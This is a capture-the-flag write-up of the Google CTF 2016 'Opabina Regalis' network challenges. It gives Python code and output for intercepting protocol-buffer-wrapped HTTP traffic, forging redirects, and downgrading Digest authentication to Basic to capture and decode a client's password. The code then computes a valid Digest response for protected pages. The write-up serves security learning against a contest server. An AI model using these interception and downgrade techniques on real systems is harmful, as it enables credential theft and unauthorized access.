---
layout: post
title: "Opabina Regalis (Google CTF 2016)"
date: 2016-05-02 23:52:19 +0200
---

(Google Capture The Flag, Networking category)

Token Fetch (Network 50)
------------------------

There are a variety of client side machines that have access to certain
websites we'd like to access. We have a system in place, called "Opabina
Regalis" where we can intercept and modify HTTP requests on the fly. Can you
implement some attacks to gain access to those websites?

Opabina Regalis makes use of
[Protocol Buffers](https://developers.google.com/protocol-buffers/) to send a
short snippet of the HTTP request for modification.

Here's the protocol buffer definition used:

```
package main;

message Exchange {
        enum VerbType {
                GET = 0;
                POST = 1;
        }

        message Header {
                required string key = 1;
                required string value = 2;
        }

        message Request {
                required VerbType ver = 1; // GET
                required string uri = 2; // /blah
                repeated Header headers = 3; // Accept-Encoding: blah
                optional bytes body = 4;
        }

        message Reply {
                required int32 status = 1; // 200 or 302
                repeated Header headers = 2;
                optional bytes body = 3;
        }

        oneof type {
                Request request = 1;
                Reply reply = 2;
        }
}
```
The network protocol uses a 32-bit little endian integer representing the
length of the marshalled protocol buffer, followed by the marshalled protocol
buffer.

Listening on port 1876 on ssl-added-and-removed-here.ctfcompetition.com

- - - - -

This challenge is the first of the **Network** category, and we need to solve
it in order to unlock the rest of the catgory.

Before starting, we need to know that protobuf is a serialization protocol
developped by Google. We have to compile the protocol buffer definiton in order
to use it with our language.

```
$ protoc dewff.proto --python_out=./
$ ls
def.proto def_pb2.py
```

Then we can start coding for this step:

```
The network protocol uses a 32-bit little endian integer representing the
length of the marshalled protocol buffer, followed by the marshalled protocol
buffer.
```

The easier way is to use construct:

```python
from construct import *

CTFMessage = Struct("CTFMessage",
    ULInt32("length"),
    Bytes("data", lambda ctx: ctx.length)
)

# Make a message respect the protocol
def buildCtfMessage(data):
    return CTFMessage.build(Container(length = len(data), data = data))
```

The we needed to make a toolbox in order to abstract the protocol buffer:

```python
from def_pb2 import *

# Build a header for a request or a reply
# this is just a helper function, we don't have to use it in the solution
def makeHeader(i):
    tmp = Exchange.Header()
    (tmp.key, tmp.value) = (i[0], i[1])
    return tmp

# Build a request
# As in the protocol vuffer definition, ver and uri are mandatory, headers is
# an optional list of tuples '(key, value)' and body is also optioal
def makeRequest(ver, uri, headers=None, body=None):
    e = Exchange()
    e.request.ver = ver
    e.request.uri = uri
    if headers != None:
        e.request.headers.extend([makeHeader(i) for i in headers])
    if body != None:
        e.request.body = body
    return buildCtfMessage(e.SerializeToString())

def makeReply(status, headers=None, body=None):
    e = Exchange()
    e.reply.status = status
    if headers != None:
        e.reply.headers.extend([makeHeader(i) for i in headers])
    if body != None:
        e.reply.body = body
    return buildCtfMessage(e.SerializeToString())

# parseReply and parseRequest both take bytes from the network and return a
# an Exchange object.
def parseReply(r):
    e = Exchange()
    e.ParseFromString(r[4:])
    return e.reply;

def parseRequest(r):
    e = Exchange()
    e.ParseFromString(r[4:])
    return e.request;
```

We also need to use SSL socket in order to communicate with the server, so lets
do it:

```python
import ssl
import socket

def makeSSLSocket(server):
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
    context.verify_mode = ssl.CERT_REQUIRED
    context.check_hostname = True
    context.load_default_certs()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s = context.wrap_socket(s, server_hostname='ssl-added-and-removed-here.ctfcompetition.com')
    s.connect(("ssl-added-and-removed-here.ctfcompetition.com", 1876))
    return s
```

So now we can start working. Lets see what the challenge looks like:

```python
# "pretty" printting, write a long line to separate data
def el():
    print("=" * 79)

s = makeSSLSocket(("ssl-added-and-removed-here.ctfcompetition.com", 1876))

tmp = s.recv(8196) # from client
print(parseRequest(tmp))
el()

s.send(tmp) # to server
tmp = s.recv(8196) # from server
print(parseReply(tmp))
```

Executing this code give us:

```
ver: GET
uri: "/not-token"
headers {
  key: "User-Agent"
  value: "opabina-regalis.go"
}

===============================================================================
status: 200
headers {
  key: "Server"
  value: "opabina-regalis.go"
}
body: "<h1>this isn\'t the token you\'re looking for</h1>"
```

When we ask for another page, the server replies:

```
status: 404
headers {
  key: "Server"
  value: "opabina-regalis.go"
}
body: "404 - file not found. Have you tried /token?"
```

Ok, so we just need to get the `/token` page:

```python
tmp = s.recv(8196) # from client

s.send(makeRequest(Exchange.GET, "/token")) # GET /token
tmp = parseReply(s.recv(8196 * 16)) # from server
print(tmp)
```

and we get this output:

```
status: 200
headers {
  key: "Server"
  value: "opabina-regalis.go"
}
body: "CTF{WhyDidTheTomatoBlush...ItSawTheSaladDressing}"
```

Redirect (Network 100)
----------------------

Following on from **Opabina Regalis - Token Fetch**, can you get access to the
/protected/secret URI?

Listening on port 13001 on `ssl-added-and-removed-here.ctfcompetition.com`

- - - - -

Let's see what the communication between the client and the server looks like:

```python
s = makeSSLSocket(("ssl-added-and-removed-here.ctfcompetition.com", 1876))

tmp = s.recv(8196) # from client
print(parseRequest(tmp))
el()

s.send(tmp) # to server
tmp = s.recv(8196) # from server
print(parseReply(tmp))
```

get us:

```
ver: GET
uri: "/protected/not-secret"
headers {
  key: "User-Agent"
  value: "opabina-regalis.go"
}

===============================================================================
status: 401
headers {
  key: "Server"
  value: "opabina-regalis.go"
}
headers {
  key: "WWW-Authenticate"
  value: "Digest realm=\"In the realm of hackers\",qop=\"auth\",nonce=\"b0f57bb35962a117\",opaque=\"b0f57bb35962a117\""
}
headers {
  key: "Content-Length"
  value: "12"
}
body: "Unauthorized"
```

So let's redirect the client to `/protected/secret`:

```python
tmp = s.recv(8196) # from client
print(parseRequest(tmp))
el()

# Do as if we were the server and redirect the client
s.send(makeReply(302, headers=[('Location', '/protected/secret')])) # to client
tmp = s.recv(8196) # from client
print(parseRequest(tmp))
el()

s.send(tmp) # to server
tmp = s.recv(8196) # from server
print(parseReply(tmp))
el()

s.send(tmp) # to client
tmp = s.recv(8196) # from client
print(parseRequest(tmp))
el()

s.send(tmp) # to server
tmp = s.recv(8196) # from server
print(parseReply(tmp))
```

The ouput of this is:

```
ver: GET
uri: "/protected/not-secret"
headers {
  key: "User-Agent"
  value: "opabina-regalis.go"
}

===============================================================================
ver: GET
uri: "/protected/secret"
headers {
  key: "User-Agent"
  value: "opabina-regalis.go"
}

===============================================================================
status: 401
headers {
  key: "Server"
  value: "opabina-regalis.go"
}
headers {
  key: "WWW-Authenticate"
  value: "Digest realm=\"In the realm of hackers\",qop=\"auth\",nonce=\"b46dee4b02227670\",opaque=\"b46dee4b02227670\""
}
headers {
  key: "Content-Length"
  value: "12"
}
body: "Unauthorized"

===============================================================================
ver: GET
uri: "/protected/secret"
headers {
  key: "Authorization"
  value: "Digest username=\"google.ctf\",realm=\"In the realm of hackers\",nonce=\"b46dee4b02227670\",uri=\"/protected/secret\",qop=\"auth\",nc=f8aaff,cnonce=\"f95d2998777f976f\",response=\"0e4b620b62e5e935ec4d19750fdea3d3\",opaque=\"b46dee4b02227670\""
}

===============================================================================
status: 200
headers {
  key: "Server"
  value: "opabina-regalis.go"
}
body: "CTF{Why,do,fungi,have,to,pay,double,bus,fares----because,they,take,up,7oo,Mushroom}"
```

Downgrade Attack (Network 100)
------------------------------

Following on from **Opabina Regalis - Token Fetch**, this challenge listens on
`ssl-added-and-removed-here.ctfcompetition.com:20691`.

To ensure that your code works as expected, you should use the following test
case:

```python
chk = CalcPass("Mufasa", "testrealm@host.com", "Circle Of Life", "GET",
               "/dir/index.html", "dcd98b7102dd2f0e8b11d0f600bfb0c093",
               "00000001", "0a4f113b")

if chk != "6629fae49393a05397450978507c4ef1" {
    your_calculation_is_incorrect();
}
```

Additionally, you should format your Exchange_Headers such as:

```python
v.Key = proto.String("Authorization")
v.Value = proto.String(`Digest username="Mufasa",realm="testrealm@host.com",nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093",uri="/dir/index.html",qop=auth,nc=00000001,cnonce="0a4f113b",response="6629fae49393a05397450978507c4ef1",opaque="5ccc069c403ebaf9f0171e9517f40e41"`)
```

- - - - -

Again, let's see the conversation withous changin anything:

```python
tmp = s.recv(8196)
print(parseRequest(tmp))
el()

s.send(tmp)
tmp = s.recv(8196)
print(parseReply(tmp))
el()

s.send(tmp)
tmp = s.recv(8196)
print(parseRequest(tmp))
el()

s.send(tmp)
tmp = s.recv(8196)
print(parseReply(tmp))
```

```
ver: GET
uri: "/protected/not-secret"
headers {
  key: "User-Agent"
  value: "opabina-regalis.go"
}

===============================================================================
status: 401
headers {
  key: "Server"
  value: "opabina-regalis.go"
}
headers {
  key: "WWW-Authenticate"
  value: "Digest realm=\"In the realm of hackers\",qop=\"auth\",nonce=\"1caad5c3e68f140f\",opaque=\"1caad5c3e68f140f\""
}
headers {
  key: "Content-Length"
  value: "12"
}
body: "Unauthorized"

===============================================================================
ver: GET
uri: "/protected/not-secret"
headers {
  key: "Authorization"
  value: "Digest username=\"google.ctf\",realm=\"In the realm of hackers\",nonce=\"1caad5c3e68f140f\",uri=\"/protected/not-secret\",qop=\"auth\",nc=5814e0,cnonce=\"21a21d5e6f4d51da\",response=\"f808513b06637503615bce3f6f96c06d\",opaque=\"1caad5c3e68f140f\""
}

===============================================================================
status: 200
headers {
  key: "Server"
  value: "opabina-regalis.go"
}
body: "<h1>this isn\'t the token you\'re looking for</h1>"
```

We saw digest authentication, so let's bypass this:

```python
import base64
import hashlib


def MD5(s):
    return hashlib.md5(s).hexdigest()

tmp = s.recv(8196) # from client
print(parseRequest(tmp))
el()

s.send(tmp) # to server
tmp = s.recv(8196) # from server
print(parseReply(tmp))
el()

# 'wwwAuth' contains the value associated to the 'WWW-Authenticate' header
wwwAuth = parseReply(tmp).headers[1].value
# We get the nonce from in the ugliest way
nonce = wwwAuth[wwwAuth.find('nonce') + len('nonce="'):]
nonce = nonce[:nonce.find('"')]
print("Nonce: " + nonce)
# We quickly found that opaque is the same as nonce in this challenge
opaque = nonce

# Ask the client to use basic authencation
tmp = makeReply(401, headers=[('WWW-Authenticate', 'Basic realm="In the realm of hackers"')])
s.send(tmp) # to client
tmp = s.recv(8196) # from client
tmp = parseRequest(tmp)
print(tmp)
el()

# Get the value associated to the 'Authorization' header
authValue = tmp.headers[0].value
# 'authValue' is "Basic " + base64("google.ctf:PASSWORD")
# let 'cred' be "google.ctf:PASSWORD"
cred = base64.b64decode(authValue[authValue.find(' ') + 1:])
# get the password and username fron 'cred'
username = cred[:cred.find(':')]
print("Username: " + username)
password = cred[cred.find(':') + 1:]
print("Password: " + password)
el()

# realm: we already have it
realm = 'In the realm of hackers'
# nc: nonce count, should be an unique number
nc = '1f4c1e1'
# cnonce: we choose this number
cnonce = 'bc02ea08bec3c25e'
# uri: the address we want
uri = '/protected/secret'
# qop: we already have it
qop = 'auth'

# The alogirthm directive is unspecified so we use this method for HA1:
HA1 = MD5(username + ':' + realm + ':' + password)
# The qop directive is 'auth' so we use this method for HA2 and the response:
HA2 = MD5('GET:' + uri)
response = MD5(HA1 + ':' + nonce + ':' + nc + ':' + cnonce + ':' + qop + ':' + HA2)

authorization = 'Digest username="' + username + '",realm="' + realm + \
    '",nonce="' + nonce + '",uri="' + uri + '",qop="auth",nc=' + nc + \
    ',cnonce="' + cnonce + '",response="' + response + '",opaque="' + opaque + '"'

tmp = makeRequest(Exchange.GET, uri, [('Authorization', authorization)])
s.send(tmp) # to server
tmp = s.recv(8196) # from server
print(parseReply(tmp))
```

Output:

```
ver: GET
uri: "/protected/secret"

===============================================================================
status: 401
headers {
  key: "Server"
  value: "opabina-regalis.go"
}
headers {
  key: "WWW-Authenticate"
  value: "Digest realm=\"In the realm of hackers\",qop=\"auth\",nonce=\"06862cecb0d40ab9\",opaque=\"06862cecb0d40ab9\""
}
headers {
  key: "Content-Length"
  value: "12"
}
body: "Unauthorized"

===============================================================================
Nonce: 06862cecb0d40ab9
ver: GET
uri: "/protected/not-secret"
headers {
  key: "Authorization"
  value: "Basic Z29vZ2xlLmN0ZjoxOTEzODI5MzM1LjEyODMwMTAxMDYuNzQwOTc2MDc1"
}

===============================================================================
Username: google.ctf
Password: 1913829335.1283010106.740976075
===============================================================================
status: 200
headers {
  key: "Server"
  value: "opabina-regalis.go"
}
body: "CTF{What:is:green:and:goes:to:summer:camp...A:brussel:scout}"
```

Input Validation (Network 100)
------------------------------

Following on from **Opabina Regalis - Fetch Token** and **Opabina Regalis -
Downgrade Attack** - can you find an input validation request that would allow
you to access otherwise protected resources?

[This](https://en.wikipedia.org/wiki/Digest_access_authentication) may give you
some inspiration on where the issue lies.

Listening on port 12001 on `ssl-added-and-removed-here.ctfcompetition.com`

- - - - -

We don't change a winning team:

```python
tmp = s.recv(8196)
print(parseRequest(tmp))
el()

s.send(tmp)
tmp = s.recv(8196)
print(parseReply(tmp))
el()

s.send(tmp)
tmp = s.recv(8196)
print(parseRequest(tmp))
el()

s.send(tmp)
tmp = s.recv(8196)
print(parseReply(tmp))
```

Give us this output:

```
ver: GET
uri: "/protected/joke"
headers {
  key: "User-Agent"
  value: "opabina-regalis.go"
}

===============================================================================
status: 401
headers {
  key: "Server"
  value: "opabina-regalis.go"
}
headers {
  key: "WWW-Authenticate"
  value: "Digest realm=\"In the realm of hackers\",qop=\"auth\",nonce=\"0b4ae2c311d6188c\",opaque=\"0b4ae2c311d6188c\""
}
headers {
  key: "Content-Length"
  value: "12"
}
body: "Unauthorized"

===============================================================================
ver: GET
uri: "/protected/joke"
headers {
  key: "Authorization"
  value: "Digest username=\"google.ctf\",realm=\"In the realm of hackers\",nonce=\"0b4ae2c311d6188c\",uri=\"/protected/joke\",qop=\"auth\",nc=e33ae5,cnonce=\"8cd0bc933beb5d5e\",response=\"08f46b47d4b6e5cb1925b8fabe113243\",opaque=\"0b4ae2c311d6188c\""
}

===============================================================================
status: 200
headers {
  key: "Server"
  value: "opabina-regalis.go"
}
body: "<h1>What do you call the rabbit next in line to the crown?</h1><p>The hare-apparent</p>"
```

We just changed the port from the previous solution (Downgrade Attack) and this
happened:

```
ver: GET
uri: "/protected/secret"

===============================================================================
status: 401
headers {
  key: "Server"
  value: "opabina-regalis.go"
}
headers {
  key: "WWW-Authenticate"
  value: "Digest realm=\"In the realm of hackers\",qop=\"auth\",nonce=\"8ca391b49fc7c325\",opaque=\"8ca391b49fc7c325\""
}
headers {
  key: "Content-Length"
  value: "12"
}
body: "Unauthorized"

===============================================================================
Nonce: 8ca391b49fc7c325
ver: GET
uri: "/protected/joke"
headers {
  key: "Authorization"
  value: "Basic Z29vZ2xlLmN0ZjoxNTQwODIxODYyLjIwNzk0MTQyNTYuMTE5NDk3OTY0MA=="
}

===============================================================================
Username: google.ctf
Password: 1540821862.2079414256.1194979640
===============================================================================
status: 404
headers {
  key: "Server"
  value: "opabina-regalis.go"
}
body: "404 - file not found. Have you tried /protected/joke or /protected/token?"
```

Ok... `sed -i 's/secret/token/g' answer.py; python answer.py` does the job.

```
ver: GET
uri: "/protected/token"

===============================================================================
status: 401
headers {
  key: "Server"
  value: "opabina-regalis.go"
}
headers {
  key: "WWW-Authenticate"
  value: "Digest realm=\"In the realm of hackers\",qop=\"auth\",nonce=\"58bb9b0afed222c8\",opaque=\"58bb9b0afed222c8\""
}
headers {
  key: "Content-Length"
  value: "12"
}
body: "Unauthorized"

===============================================================================
Nonce: 58bb9b0afed222c8
ver: GET
uri: "/protected/joke"
headers {
  key: "Authorization"
  value: "Basic Z29vZ2xlLmN0Zjo1NjY4OTE2MjUuMTA1OTYzNTA2LjE3NTU5NDYzODg="
}

===============================================================================
Username: google.ctf
Password: 566891625.105963506.1755946388
===============================================================================
status: 200
headers {
  key: "Server"
  value: "opabina-regalis.go"
}
body: "CTF{-Why-dont-eggs-tell-jokes...Theyd-crack-each-other-up-}"
```

Easiest 100 points of the CTF.

SSL Stripping (Network 75)
---------------------------

Following on from **Opabina Regalis - Fetch Token**, can you implement an SSL
stripping attack?

Listening on port 19121 on `ssl-added-and-removed-here.ctfcompetition.com`

- - - - -

We do as before, the server sends a html document to the client.

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>See your latest examples</title>

    <!-- Bootstrap core CSS -->
    <link href="../../dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <link href="../../assets/css/ie10-viewport-bug-workaround.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="jumbotron.css" rel="stylesheet">

    <script src="../../assets/js/ie-emulation-modes-warning.js"></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>

  <body>

    <nav class="navbar navbar-inverse navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="#">HTTP is the threat actors delight. Learn how to protect your website now!</a>
        </div>
        <div id="navbar" class="navbar-collapse collapse">
          <form method="POST" action="https://elided/user/sign_in" class="navbar-form navbar-right">
            <div class="form-group">
              <input name="email" type="text" placeholder="Email" class="form-control">
            </div>
            <div class="form-group">
              <input type="password" name="password" placeholder="Password" class="form-control">
            </div>
            <button type="submit" class="btn btn-success">Sign in</button>
          </form>
        </div><!--/.navbar-collapse -->
      </div>
    </nav>

    <div class="jumbotron">
      <div class="container">
        <h1>Are you broadcasting your secrets to everyone?</h1>
        <p>Sending clear text data - regardless of it's purpose, is a bad idea, and will be used against you.</p>
        <p><a class="btn btn-primary btn-lg" href="#" role="button">Learn more &raquo;</a></p>
      </div>
    </div>

    <div class="container">
      <!-- Example row of columns -->
      <div class="row">
        <div class="col-md-4">
          <h2>Threat Actors Love Plaintext HTTP</h2>
          <p>Are your users leaking private information over plaintext HTTP? It could be identifying information of ethnic information, or their corporate passwords, or other protected information? You should ensure your sites are using suitable encryption standards to keep them safe.</p>
          <p><a class="btn btn-default" href="#" role="button">View details &raquo;</a></p>
        </div>
        <div class="col-md-4">
          <h2>Are your servers misconfigured?</h2>
          <p>Do you still respond with plaintext HTTP even though you support HTTPS? Do you think that just having https:// links for sensitive information is a suitable practice? Learn more about how to correctly use HTTPS with your applications, and why "https everywhere" should be mandatory</p>
          <p><a class="btn btn-default" href="#" role="button">View details &raquo;</a></p>
       </div>
        <div class="col-md-4">
          <h2>Advanced TLS</h2>
          <p>Are you ready to learn more about advanced TLS protections available, such as HTTP Strict Transport Security, where you can prevent browsers from using insecure plaintext HTTP connections to your site?</p>
          <p><a class="btn btn-default" href="#" role="button">View details &raquo;</a></p>
        </div>
      </div>

      <hr>

      <footer>
        <p>&copy; 2015 This Was a Good Idea Many Years Ago, Now Get Your Sites ShipShape, Inc.</p>
      </footer>
    </div> <!-- /container -->


    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
    <script>window.jQuery || document.write('<script src="../../assets/js/vendor/jquery.min.js"><\/script>')</script>
    <script src="../../dist/js/bootstrap.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
  </body>
</html>
```

After a quick hand parsing we find this url: `https://elided/user/sign_in`, so
let's just try this:

```python
tmp = s.recv(8196) # from client
print(parseRequest(tmp))

el()
s.send(makeRequest(Exchange.POST, "/user/sign_in")) # to server
tmp = parseReply(s.recv(8196 * 16)) # from server
printReply(tmp)
```

and we get the key:

```
ver: GET
uri: "/"
headers {
  key: "User-Agent"
  value: "opabina-regalis.go"
}

===============================================================================
status: 302
headers {
  key: "Server"
  value: "opabina-regalis.go"
}
headers {
  key: "Location"
  value: "/content"
}
headers {
  key: "Flag"
  value: "CTF{Why=were=the=apple=and=the=orange=all=alone..Because=the=banana=spli7}"
}
body: "CTF{Why=were=the=apple=and=the=orange=all=alone..Because=the=banana=spli7}"
```

